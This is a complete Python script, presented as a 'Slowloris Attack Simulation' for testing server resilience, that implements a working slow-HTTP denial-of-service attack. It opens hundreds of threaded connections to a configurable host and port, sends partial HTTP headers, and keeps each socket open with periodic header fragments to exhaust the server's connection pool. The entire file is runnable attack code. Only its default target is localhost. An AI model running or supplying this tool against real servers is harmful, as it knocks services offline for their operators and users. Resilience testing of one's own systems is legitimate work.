#!/usr/bin/env python3
"""
Slowloris Attack Simulation
Tests server resilience against slow HTTP attacks
"""

import socket
import threading
import time
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

class SlowlorisAttacker:
    def __init__(self, target_host, target_port, connections=1000, request_interval=10):
        self.target_host = target_host
        self.target_port = target_port
        self.connections = connections
        self.request_interval = request_interval  # seconds between partial sends
        self.active_connections = []
        self.stats = {
            'total_sockets': 0,
            'successful_connections': 0,
            'failed_connections': 0,
            'bytes_sent': 0,
            'responses_received': 0
        }
        
    def create_partial_request(self):
        """Create a partial HTTP request header"""
        return (
            "GET / HTTP/1.1\r\n"
            "Host: {}\r\n"
            "User-Agent: slowloris-attack/1.0\r\n"
            "Accept: */*\r\n"
            "Connection: keep-alive\r\n"
        ).format(self.target_host)
    
    def create_socket(self):
        """Create and connect a socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # 5 second timeout
            sock.connect((self.target_host, self.target_port))
            self.stats['successful_connections'] += 1
            return sock
        except Exception as e:
            self.stats['failed_connections'] += 1
            print(f"Connection failed: {e}")
            return None
    
    def slowloris_connection(self, conn_id):
        """Maintain a single slowloris connection"""
        sock = self.create_socket()
        if not sock:
            return
        
        partial_request = self.create_partial_request()
        bytes_sent = 0
        
        try:
            # Send partial request
            sock.send(partial_request.encode())
            bytes_sent = len(partial_request)
            self.stats['bytes_sent'] += bytes_sent
            
            print(f"Connection {conn_id}: Sent {bytes_sent} bytes, maintaining...")
            
            # Keep connection alive with periodic partial data
            while True:
                time.sleep(self.request_interval)
                
                try:
                    # Send a tiny fragment to keep connection alive
                    fragment = "X-A: {}\r\n".format(conn_id)
                    sock.send(fragment.encode())
                    self.stats['bytes_sent'] += len(fragment)
                    
                    # Try to read any response
                    try:
                        data = sock.recv(1024)
                        if data:
                            self.stats['responses_received'] += 1
                            print(f"Connection {conn_id}: Got response ({len(data)} bytes)")
                    except socket.timeout:
                        pass  # No response, continue
                    
                except (socket.error, ConnectionResetError):
                    print(f"Connection {conn_id}: Lost connection")
                    break
                    
        except Exception as e:
            print(f"Connection {conn_id}: Error: {e}")
        finally:
            try:
                sock.close()
            except:
                pass
    
    def attack(self):
        """Launch the slowloris attack"""
        print(f"🚨 Starting Slowloris Attack Simulation")
        print(f"🎯 Target: {self.target_host}:{self.target_port}")
        print(f"🔗 Connections: {self.connections}")
        print(f"⏱️  Request Interval: {self.request_interval}s")
        print(f"📊 Monitoring...")
        print()
        
        self.stats['total_sockets'] = self.connections
        
        # Launch slowloris connections
        with ThreadPoolExecutor(max_workers=self.connections) as executor:
            futures = []
            
            for i in range(self.connections):
                future = executor.submit(self.slowloris_connection, i)
                futures.append(future)
                
                # Small delay between connection attempts
                time.sleep(0.01)
            
            # Monitor progress
            start_time = time.time()
            last_report = start_time
            
            try:
                while any(not f.done() for f in futures):
                    current_time = time.time()
                    
                    # Report progress every 10 seconds
                    if current_time - last_report >= 10:
                        completed = sum(1 for f in futures if f.done())
                        active = len(futures) - completed
                        elapsed = current_time - start_time
                        
                        print(f"📊 Progress: {completed}/{self.connections} completed, {active} active, "
                              f"{elapsed:.1f}s elapsed")
                        print(f"   Stats: {self.stats['successful_connections']} successful, "
                              f"{self.stats['failed_connections']} failed, "
                              f"{self.stats['bytes_sent']} bytes sent, "
                              f"{self.stats['responses_received']} responses")
                        print()
                        
                        last_report = current_time
                    
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print("\n⚠️ Attack interrupted by user")
            
        # Final report
        total_time = time.time() - start_time
        print(f"\n🏁 Attack Complete!")
        print(f"⏱️  Duration: {total_time:.1f}s")
        print(f"📊 Final Stats:")
        print(f"   Total connections attempted: {self.stats['total_sockets']}")
        print(f"   Successful connections: {self.stats['successful_connections']}")
        print(f"   Failed connections: {self.stats['failed_connections']}")
        print(f"   Bytes sent: {self.stats['bytes_sent']}")
        print(f"   Responses received: {self.stats['responses_received']}")
        print(f"   Success rate: {(self.stats['successful_connections']/self.stats['total_sockets']*100):.1f}%")

def main():
    parser = argparse.ArgumentParser(description='Slowloris Attack Simulation')
    parser.add_argument('--host', default='127.0.0.1', help='Target host (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=8080, help='Target port (default: 8080)')
    parser.add_argument('--connections', type=int, default=100, help='Number of connections (default: 100)')
    parser.add_argument('--interval', type=int, default=5, help='Request interval in seconds (default: 5)')
    
    args = parser.parse_args()
    
    attacker = SlowlorisAttacker(args.host, args.port, args.connections, args.interval)
    
    try:
        attacker.attack()
    except KeyboardInterrupt:
        print("\n⚠️ Attack interrupted")
        sys.exit(0)

if __name__ == "__main__":
    main()
